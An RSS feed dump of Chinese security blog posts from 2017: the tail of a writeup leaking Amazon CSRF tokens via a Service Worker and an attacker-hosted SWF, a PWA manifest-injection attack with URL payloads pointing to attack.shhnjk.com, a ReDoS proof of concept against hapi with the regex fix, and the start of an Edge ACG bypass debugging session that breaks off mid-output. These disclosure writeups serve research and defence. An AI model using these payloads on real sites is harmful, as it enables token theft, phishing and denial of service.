Worker也将支持周期性同步或地理围栏等其他任务。)&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;The reason this is such an exciting API is that it&lt;br&gt;allows you to support offline experiences, giving developers complete control&lt;br&gt;over the experience.&lt;/i&gt;&lt;/blockquote&gt;&lt;p&gt;(更令人激动的是它对离线功能的支持，以及开发者完全控制的能力。)&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在让我简单地描述这个攻击的原理和每个文件的代码：&lt;/p&gt;&lt;p&gt;&lt;b&gt;1&lt;/b&gt; 写一段 AS( ActionScript) 代码向 &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//amazon.com&quot;&gt;http://amazon.com&lt;/a&gt;发送一个 HTTPS请求，并接收响应内容 在响应内容页面中寻找 CSRF Token,代码如下:&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;import flash.external.*;
import flash.net.*;

(function
() {
Var loader = newURLLoader(newURLRequest(&quot;https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/&quot;));

  loader.addEventListener(&quot;complete&quot;, loaderCompleted);

  function loaderCompleted(event) {

  ExternalInterface.call(&quot;alert&quot;,
event.target.data.slice(189270,189335));
}
})();
&lt;/code&gt;&lt;p&gt;这个脚本文件放到了我的网站( &lt;a href=&quot;http://link.zhihu.com/?target=http%3A//ahussam.me&quot;&gt;http://ahussam.me&lt;/a&gt;)上，名字为 myexp.as 后面会用到,同时使用 flex SDK 来生成对应版本的SWF代码，我还创建了一个 PHP 脚本来生成来自 AS 代码的 SWF 文件，我将很快在我的 Github 帐户中发布。&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;2&lt;/b&gt; JS文件将被注册成网站的 Service Worker，使我能够代理流量并在此路径上创建 SWF文件响应。下面是JS代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;var url =&quot;https://ahussam.me/myexp.swf&quot;
onfetch =(e)=&amp;gt; {
 e.respondWith(fetch(URL);
}&lt;/code&gt;&lt;p&gt;在 crossdomain.xml的帮助下，这些代码可以在这个路径上安装作为 Service Worker的 SWF文件（myexp.swf）并对主站的 CSRF tokens进行抓取)&lt;br&gt;&lt;/p&gt;&lt;p&gt;我先上传它，得到一个新的文件名(文件名在上传后会更改)。然后重命名为sw.txt，来通过附件的检测。在这里我改变了内容类型。上传后，文件名成为4837-sw.txt。&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是 HTTP请求：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2c5be871709afe98fbfe0c043125ece1_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1366&quot; data-rawheight=&quot;768&quot;&gt;&lt;p&gt;&lt;b&gt;3&lt;/b&gt; HTML页面会为这个 SVG文件包含 xml和 JS的 Service Worker注册。&lt;/p&gt;&lt;p&gt;下面是 JS代码：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;if（&#39;serviceWorker&#39;in navigator）{
//
4837-sw.txt is the previous file.
navigator.serviceWorker.register（
&#39;4837-sw.txt&#39;）.then（_ =&amp;gt;location= 1337）;
}
&lt;/code&gt;&lt;p&gt;像之前一样，我改变了文件扩展名和内容类型&lt;/p&gt;&lt;p&gt;这里是 HTTP请求：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-355215ae6b139a8b17a04e9c16c9baa8_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1366&quot; data-rawheight=&quot;768&quot;&gt;&lt;p&gt;这是我的 PoC地址：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://gamedev.amazon.com/forums/storage/attachments/4937-svg.txt&lt;/code&gt;&lt;p&gt;这个利用第一次没有成功（因为我使用HTTP协议,而Service Worker也仅在HTTPS中可行，如果没有SWF文件的https网站，则可以在fetch函数中使用data-URI和base64编码），我也是经过了一番调试才成功的！&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d268cf821dd36f2b2dcac21c20541d91_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;442&quot; data-rawheight=&quot;155&quot;&gt;&lt;p&gt;随后，我向亚马逊团队发送了 PoC。由于报告的篇幅长度，他们没有仔细查看内容并引起相关重视。Gamedev 团队删除了我的 PoC 打消了我再发报告的念头！&lt;br&gt;&lt;/p&gt;&lt;p&gt;于是我做了一个视频来简洁展示 PoC 报告内容。但是他们无法马上观看。于是我重新上传，再现此漏洞的验证过程。&lt;br&gt;&lt;/p&gt;&lt;p&gt;经过几个月的等待，他们没有回复我的消息，但是不久后就发现这个bug已经修复了。于是我发送了一封很长的信告诉他们，我对他们处理安全报告的方式感到十分不满。相比系统自动回复的消息，我(以及每个花费时间的去使网络环境更好的人)更想得到相应的的回报，而不是安全团队的一句简单&quot;谢谢!&quot;。&lt;/p&gt;&lt;p&gt;一段时间后我收到了下面这条消息：&lt;/p&gt;&lt;blockquote&gt;&lt;i&gt;Hi Abdullah,&lt;/i&gt; &lt;i&gt;I apologise for&lt;br&gt;the delay in getting back to you and the lack of confirmation whether this&lt;br&gt;issue was fixed. It has been addressed by the service team; I would like to&lt;br&gt;pass along their thanks, as well as my own, for discovering this issue.&lt;/i&gt; &lt;i&gt;Presently, we&lt;br&gt;do not participate in a bug bounty program or offer rewards for security&lt;br&gt;research. However, I understand your desire for a more dynamic and immediate&lt;br&gt;reward system for reported security concerns. We will incorporate this feedback&lt;br&gt;as we continue to improve our security issue response process.&lt;/i&gt; &lt;i&gt;We look forward&lt;br&gt;to hearing more from you and working together to protect AWS customers. Thank&lt;br&gt;you for your time, consideration, and sharing our passion for security.&lt;/i&gt; &lt;i&gt;Best RegardsXXXXXXX XXX.&lt;/i&gt; &lt;i&gt;AWS Security&lt;/i&gt; &lt;i&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//aws.amazon.com/security&quot;&gt;https://aws.amazon.com/security&lt;/a&gt;&lt;/i&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;(你好 &lt;i&gt;Abdullah&lt;/i&gt;，&lt;br&gt;对于延迟回复您此问题是否得到修复，我们深表歉意。服务团队已经解决了这个问题。我和整个服务团队都很感激您发现了这个问题。&lt;br&gt;目前，我们还没有漏洞奖励计划来为安全研究提供奖励。我了解到您希望我们为报告的安全性问题提供更加灵活和及时的奖励制度，我们也将纳入您的这些反馈意见，在我们继续改进我们的安全问题响应的过程中。 &lt;br&gt;我们期待着来自您的更多建议和发现，并能和我们共同合作，保护AWS客户。感谢您的花费的时间，对用户安全的考虑和分享您的发现以及我们对安全的热情。&lt;br&gt;最好的祝福&lt;br&gt;XXXXXXX XXX。&lt;br&gt;AWS安全&lt;br&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//aws.amazon.com/security&quot;&gt;https://aws.amazon.com/security&lt;/a&gt;)&lt;/blockquote&gt;&lt;h2&gt;&lt;b&gt;结束语&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;由于我能够窃取CSRF Tokens，所以有一种方法来改变用户的电话号码，这可能导致完全帐户接管。更多的攻击不仅可以做到CSRF，而且可能会造成信息泄露，Oauth认证，地址披露等问题。&lt;/p&gt;&lt;p&gt;我希望你们喜欢我的文章，并能学到一些东西。谢谢你们的阅读。&lt;/p&gt;&lt;p&gt;也许我应该在这里提到。这种方法已被用于 Cure53 XSSmas的挑战，不一样但非常接近。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;参考：&lt;/b&gt;&lt;a href=&quot;http://link.zhihu.com/?target=https%3A//ahussam.me/Amazon-leaking-csrf-token-using-service-worker/&quot;&gt;Leaking Amazon.com CSRF Tokens Using Service Worker API&lt;/a&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-17-30214540</guid>
<pubDate>Tue, 17 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>PWA-Progressive Web Attack</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-11-30036967.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;PWA-Progressive Web Attack&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30036967&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;今天，我将要讲述的是有关 PWA(Progressive Web Apps，即网页版App)的相关内容.&lt;/p&gt;&lt;p&gt;近些日子以来，随着 CSP（内容安全策略）的运用和帮助，缓解了很大一部分潜在的跨站脚本问题，网站通过 CSP将 XSS(跨站脚本攻击)转换成 HTML注入，安全性能得到提升。有时甚至在面对存在 XSS漏洞的却没有使用CSP的现代网页时，我们也可能感到束手无策。&lt;/p&gt;&lt;p&gt;但是，假如出现了一种可以仅通过 HTML注入，就可以在浏览器管理系统原生界面安装APP的方式呢？&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Progressive Web Apps&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;PWA是一种拥有响应用户和离线功能（运用 Service Worker，Cache API等）的网页应用程序，这也就意味着它和原生应用程序非常地接近。&lt;/p&gt;&lt;p&gt;但是，请想一想，我们能够通过 Application Cache来实现它吗？答案是肯定的，因为 PWA是可以在 Web APP Manifest的运用下实现安装的。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;Progressive Web Attack&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Web App Manifest很特殊，它具备在浏览器管理原生界面中触发 PWA安装提示的功能。使用一个指向符合跨域（任何类型）的 Manifest文件链接标签就可以轻易实现。&lt;/p&gt;&lt;p&gt;那么让我们来看看该如何利用这个特性？&lt;/p&gt;&lt;p&gt;假设受害站点具备离线功能并且检测出在 Service Worker服务范围的网页中存在 XSS漏洞，但是却在该站点中使用了相当严格的 CSP。&lt;/p&gt;&lt;p&gt;Victim site：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/&lt;/code&gt;&lt;p&gt;Vulnerable page：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=Guest&lt;/code&gt;&lt;p&gt;And here is how to trigger installation prompt.&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=%3C/title%3E%3Clink%20rel=manifest%20href=//attack.shhnjk.com/manifest.txt%3E%3C/head%3E%3Cbody%3E%3Ch1%3EHey!%20Try%20our%20New%20App!%3C!--&lt;/code&gt;&lt;p&gt;首先，确定进入了主页面来保证 Servive Worker已注册,然后接下来，使用 Andriod系统的Chrome浏览器进入上述的网址，你会看到下面的情况：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-8f6ecb47707fa4a8186b7fe6579a7bc4_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;323&quot; data-rawheight=&quot;505&quot;&gt;&lt;p&gt;点击 “Add”（不好意思，我的手机默认语言为日语，即上图“追加”）按钮时会开启下载内容并在手机的桌面创建图标，当你打开这个 App，你就会看到下面的页面：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;https://pwa.shhnjk.com/profile.php?name=%3C/title%3E%3C/head%3E%3Cbody%3E%3Ciframe%20frameBorder=%220%22%20width=%22100%%22%20height=%22100%%22%20src=%22//attack.shhnjk.com/success.html%22%3E&lt;/code&gt;&lt;p&gt;该页面是框架攻击者设置的页面.由于 app的起始页面受到了攻击者的 manifest文件的控制并且只具有攻击者提供的导航功能（没有地址栏，后退或者转发的按钮），使用者将完全陷入攻击者的控制当中。和原始受害站点告别，用户将从现在起陷入攻击！&lt;/p&gt;&lt;p&gt;这一切都仅仅是在 HTML注入的方式下实现的。&lt;/p&gt;&lt;p&gt;顺便说一句，我认为浏览器提供的安装提示不是很安全，它在提示给用户时只会显示顶层域，因此任何允许将用户内容上传到子域的网站（例如 Shopify）就可被用于钓鱼攻击。&lt;/p&gt;&lt;p&gt;无论如何，以下有几点是该项技术的限制：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;指向 manifest文件的 link标签需要包含在head标签内。&lt;/li&gt;&lt;li&gt;start_url需要与受害站点同源。&lt;/li&gt;&lt;li&gt;即使在 app内部，将顶级文档导航到跨原始站点也将触发地址栏,甚至在应用程序中的显示。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;最后一点，我认为 manifest文件仅仅应该在符合同源的情况下被接受，规格也需要得到更加仔细的思考（希望能够得到改变）&lt;/p&gt;&lt;p&gt;为了防止这种类型的攻击，请确保使用安全的下载源或在不使用 PWA(和 AppCache)的情况下将 CSP中的 manifest-src设置为“none”。 &lt;/p&gt;&lt;p&gt;希望你们能够喜欢我的分享。&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-11-30036967</guid>
<pubDate>Wed, 11 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>基于正则表达式的 DDoS 及实例讲解</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-07-29920988.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;基于正则表达式的 DDoS 及实例讲解&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29920988&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在之前的&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28424183&quot;&gt;文章&lt;/a&gt;中，我们讲解过基于hash的 DoS 攻击。这篇文章中，我们将带来基于正则表达式类型的（Regular Expression）拒绝服务攻击的讲解。最后，我们用 hapi 框架的一个漏洞作为实例解析。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;什么是 ReDoS？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;当一个正则表达式包含了冗余的匹配，那么它就极有可能引发 ReDoS（即:基于正则表达式的拒绝服务攻击）。由于过多的匹配，正则引擎的匹配速度会飞速下滑。就拿 &lt;b&gt;(a+)+ &lt;/b&gt;来说，当我们输入 &lt;b&gt;aa &lt;/b&gt;时，正则引擎会匹配成 &lt;b&gt;(a)(a)&lt;/b&gt; 或者&lt;b&gt; (aa)&lt;/b&gt;。如果我们输入了 &lt;b&gt;aaa&lt;/b&gt;，正则引擎就会查询&lt;b&gt;(aaa)&lt;/b&gt;，&lt;b&gt;(aa)(a)&lt;/b&gt;，&lt;b&gt;(a)(aa)&lt;/b&gt;，甚至是 &lt;b&gt;(a)(a)(a)&lt;/b&gt;。很明显，我们每多输入一个字母 &lt;b&gt;a&lt;/b&gt;，匹配的数量就要乘以2。不过有一点需要注意，我们最终传递进去的字符最终需要被匹配&lt;b&gt;&lt;i&gt;失败&lt;/i&gt;&lt;/b&gt; ，否则短路效应会直接结束匹配并返回结果，反之则会一直枚举可能的情况。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;寻找问题&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;有了基本知识，让我们来实际操作一下。一个正则表达式如下（最新版本已被修复）：&lt;/p&gt;&lt;code lang=&quot;python3&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看上去很棘手，不过只要问题的核心是冗余的表达式，我们就一定能发现漏洞。我们从头开始，第一个可疑处是 &lt;b&gt;\s*(?:([^;&#39;]+\&#39;[\w-]*\&#39;[^;\s]+)&lt;/b&gt;（排除多余的部分后，我们可以简化其为 &lt;b&gt;\s*[^;&#39;]+&lt;/b&gt;）。用自然语言来描述，大概意思就是找到跟随任意数量空格的非冒号或单引号的一个或多个字符。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在这个 &lt;a href=&quot;https://github.com/hapijs/content&quot;&gt;repo&lt;/a&gt; 中，我们可以得知这个表达式是 content 库用来解析 &lt;b&gt;Content-Dposistion &lt;/b&gt;头中的参数。一个合法的 &lt;b&gt;Content-Dposistion &lt;/b&gt;看上去像：&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition:form-data; name=&quot;content&quot;;filename=&quot;hello.txt&quot;&lt;/b&gt;。为了确认这一点，我们来用这个模块解析一下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const Content = require(&#39;content&#39;);
const header = &#39;form-data; name=&quot;content&quot;; filename=&quot;hello.txt&quot;&#39;;
console.time(&#39;parse&#39;);
console.log(Content.disposition(header));
console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;如果你安装了 &lt;a href=&quot;mailto:%60content@3.0.5%60&quot;&gt;content@3.0.5&lt;/a&gt; 或之前的版本，你会得到这个：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{ name: &#39;content&#39;, filename: &#39;hello.txt&#39; }
parse: 6.200ms
&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;我们已知可以利用空格，并且构造的payload必须被匹配失败，那么应该如何写出PoC呢？答案很简单，先传入非空格字符，再在后面附加上尽可能多的空格。我们来做个500字的测试：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Content = require(&#39;content&#39;);
const
header = &#39;form-data; x&#39; + new Array(500).join(&#39; &#39;);

console.time(&#39;parse&#39;);
console.log(Content.disposition(header));
console.timeEnd(&#39;parse&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这是输出：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;json&quot;&gt;{
Error: Invalid content-disposition header format includes invalid parameters /*
snip */ }
parse:
47.440ms&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;解析速度比原来慢了接近8倍，但总的来说还不算严重。当空格为1000时，解析则花了292ms，当我们再加多1000个空格后，解析器花了2387ms 执行。问题很明显了，不过我们依然不清楚它会有多严重的影响。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;利用content攻击hapi&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Content-Disposition &lt;/b&gt;一般用来告诉客户端响应主体是内联的还是一个附件，有时也用来提供关于multipart form（多重表单）的元数据信息。由于第一个（用途）往往为服务器发出，我们就需要找出使用该框架解析 &lt;b&gt;Content-Disposition &lt;/b&gt;的客户端，而这十分罕见，所以我们不做讨论。不过第二种情况则屡见不鲜，让我们一起研究一下。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;由于hapi使用content，我们就可以用它攻击hapi服务器。首先，我们得模拟接收表单（复现需要&lt;a href=&quot;mailto:hapi@16.5.2&quot;&gt;hapi@16.5.2&lt;/a&gt;及以下的版本）：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Hapi = require(&#39;hapi&#39;);
const
server = new Hapi.Server();

server.connection({
port: 8080 });
server.route({
method: &#39;post&#39;,
path: &#39;/&#39;,
handler: function (request, reply) {
return reply();
}
});

server.start(()
=&amp;gt; {
console.log(&#39;started&#39;);
});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在我们可以开始构造PoC了：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;&#39;use strict&#39;;
const
Wreck = require(&#39;wreck&#39;);

const
payload = [
&#39;--123456&#39;,
&#39;content-disposition: form-data; x&#39; + new
Array(2000).join(&#39; &#39;),
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456&#39;,
&#39;content-disposition: form-data;
name=&quot;field2&quot;&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456--&#39;
].join(&#39;\r\n&#39;);

console.time(&#39;req&#39;);
Wreck.post(&#39;http://localhost:8080&#39;,
{ headers: { &#39;content-type&#39;: &#39;multipart/form-data; boundary=123456&#39;,
&#39;content-length&#39;: Buffer.byteLength(payload) }, payload }, (err, res, body)
=&amp;gt; {
console.timeEnd(&#39;req&#39;);
});&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这一段代码跑了 46ms。似乎没有想象中这么慢，让我们看看哪里出来问题。翻了一段又一段的执行链，我们发现 hapi 使用 &lt;a href=&quot;https://github.com/hapijs/subtext&quot;&gt;subtext&lt;/a&gt; 中的 &lt;a href=&quot;https://github.com/hapijs/pez&quot;&gt;pez&lt;/a&gt; 解析payload。pez 会截断一个 header 的结束与另一个 header 的开头之间额外的空格，所以我们需要在空格结尾添加一个字符（用来表示该 header 还没结束）防止空格被移除：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;const payload = [
&#39;--123456&#39;,
&#39;content-disposition: form-data; x&#39; + new
Array(2000).join(&#39; &#39;) + &#39;x&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456&#39;,
&#39;content-disposition: form-data;
name=&quot;field2&quot;&#39;,
&#39;content-type: text/plain&#39;,
&#39;&#39;,
&#39;text&#39;,
&#39;--123456--&#39;
].join(&#39;\r\n&#39;);&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这个 PoC 则执行了2000多ms，大功告成了！不过我们应该如何修复呢？&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;正确的解析方式&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;前一个式子是因为空格的冗余匹配而导致的，因此，我们只需要在匹配字符时将空格也纳入黑名单即可：&lt;b&gt;\s*[^;&#39;\s]+&lt;/b&gt;，我们先来试试这种简单粗暴的改法：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;再运行一次 PoC，结果还是跑了两千多毫秒。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;在该表达式开头处，你会看到 &lt;b&gt;[^\=\*]+\s*&lt;/b&gt;。因此，我们还需修正此处：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;/([^\=\*\s]+)(\*)?\s*\=\s*(?:([^;&#39;\s]+\&#39;[\w-]*\&#39;[^;\s]+)|(?:\&quot;([^&quot;]*)\&quot;)|([^;\s]*))(?:(?:\s*;\s*)|(?:\s*$))/g&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;现在，执行一次 PoC 仅需六十多毫秒，终于大功告成了！&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-07-29920988</guid>
<pubDate>Sat, 07 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>利用 DuplicateHandle 绕过 Edge 代码执行保护</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-03-29859057.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;利用 DuplicateHandle 绕过 Edge 代码执行保护&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29859057&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;在这篇文章中，我们将讲解如何绕过 Edge 的 ACG（Arbitrary Code Guard，代码执行保护)。该问题可以在装有Edge 40.15063.0.0 的 Windows 10 企业版（Creator Update，Version 1703, OS build 15063.413）中复现。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;背景&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;Edge 通过[分离 JIT（即时编译）](https://bugs.chromium.org/p/project-zero/issues/detail?id=1299)实现 ACG。JIT同时需要映射原生代码到内容进程（Content Process）中。当 JIT 被调用时，它会暴露内容进程和JIT之间通信的 LRPC（轻量级远程过程调用）server。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;为了在调用过程中映射可执行内存，JIT需要（调用JIT的）进程的句柄。它如何得到该句柄呢？该调用进程需要在（伪）句柄中使用DuplicateHandle以将其发送给JIT。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;那么问题来了。在调用DuplicateHandle时，内容进程需要拥有目标进程（此处是JIT)的句柄以及PROCESS_DUP_HANDLE权限 &lt;b&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms724251.aspx&quot;&gt;参考&lt;/a&gt;&lt;/b&gt;。然而，这也使得内容进程可以完全地控制 JIT。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx&quot;&gt;https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx&lt;/a&gt; 是这么描述的：&lt;/p&gt;&lt;blockquote&gt;注意！用户可以通过某些访问权限的进程可以使用它们来获取其它访问权限。假设进程A有进程B的句柄且对其有PROCESS_DUP_HANDLE权限，它就可以创建一个B的伪句柄。该句柄能对B拥有完整控制权。如果你想知道更多有关伪句柄的咨询，请参见GetCurrentProcess。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;让我们来debug一下：&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;b&gt;输入以下命令，WinDBG就会开始调试 MicrosoftEdge.exe 和 MicrosoftEdgeCP.exe &lt;/b&gt;&lt;/p&gt;&lt;code lang=&quot;ps1con&quot;&gt;plmdebug.exe /enableDebug Microsoft.MicrosoftEdge_40.15063.0.0_neutral__8wekyb3d8bbwe &quot;c:\Program Files (x86)\Windows Kits\10\Debuggers\x64\windbg.exe&quot;&lt;/code&gt;&lt;p&gt;&lt;b&gt;打开microsoft-edge: &lt;a href=&quot;http://www.google.com/&quot;&gt;http://www.google.com&lt;/a&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;这时会有两个 MicrosoftEdgeCP.exe，第一个是 JIT 进程，第二个是内容进程&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;用 WinDBG 调试内容进程（在这个例子中，它的 PID 为5104）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:000&amp;gt;
bp chakra!ThreadContext::EnsureJITThreadContext
Bp
expression &#39;chakra!ThreadContext::EnsureJITThreadContext&#39; could not be
resolved, adding deferred bp
0:000&amp;gt;
g

...

Breakpoint
0 hit
chakra!ThreadContext::EnsureJITThreadContext:
00007ff8`1a3079a4
488bc4 mov rax,rsp&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;在调用 DuplicateHandle 之前，我设置了额外的断点来捕捉 JIT 的句柄。注意，在真实的环境中，JIT 进程句柄会被存储在内存中，拥有内存读取权限的攻击者能够轻松获得它。即使攻击者不能直接读取句柄，其实也可以通过爆破的方式猜解出句柄（数值非常小)。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;ca65&quot;&gt;0:015&amp;gt;
bp 00007ff8`1a307a4d
0:015&amp;gt;
g
Breakpoint
1 hit
chakra!ThreadContext::EnsureJITThreadContext+0xa9:
00007ff8`1a307a4d
ff1575785b00 call qword ptr [chakra!_imp_DuplicateHandle
(00007ff8`1a8bf2c8)] ds:00007ff8`1a8bf2c8={KERNELBASE!DuplicateHandle
(00007ff8`34408de0)}
0:015&amp;gt;
r
rax=ffffffffffffffff
rbx=ffffffffffffffff rcx=ffffffffffffffff
rdx=ffffffffffffffff
rsi=0000000000000000 rdi=0000000000000960
rip=00007ff81a307a4d
rsp=000000d2717fb9f0 rbp=000000d2717fba99
r8=0000000000000960 r9=000000d2717fba48 r10=00000fff034a85c4
r11=4444455511111111
r12=00000000000004bf r13=0000000000001210
r14=00000251fcb2aa80
